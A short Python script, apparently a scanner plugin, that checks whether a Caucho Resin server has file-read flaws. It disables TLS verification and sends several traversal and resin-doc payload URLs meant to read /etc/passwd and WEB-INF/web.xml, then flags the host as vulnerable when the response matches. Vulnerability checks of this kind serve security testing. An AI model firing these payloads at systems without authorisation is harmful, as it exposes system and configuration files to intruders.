#coding:utf-8

import urllib.request, urllib.error, urllib.parse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if resin file read vul')
    resin_payloads=['/resin-doc/viewfile/?contextpath=/otherwebapp&servletpath=&file=WEB-INF/web.xml','/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd','/%20..\\web-inf','/%3f.jsp','/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd']
    for resin_payload in resin_payloads:
        try:
            vul_url = url + resin_payload
            print('testing '+vul_url+'.')
            res_html = urllib.request.urlopen(vul_url,timeout=5).read()
            if b"root:" in res_html or b"xml version" in res_html or b"<h1>Directory of" in res_html or b"<h1>Directory of" in res_html:
                msg = 'There is resin file read vul in :'+url+'. The payload is :'+vul_url+' .'
                print(msg)
                number = 'v40'
                return True,url,number,msg
            else:
                continue
        except Exception as e:
            continue
    msg = 'There is no resin file read vul'
    number = 'v0'
    return False,url,number,msg
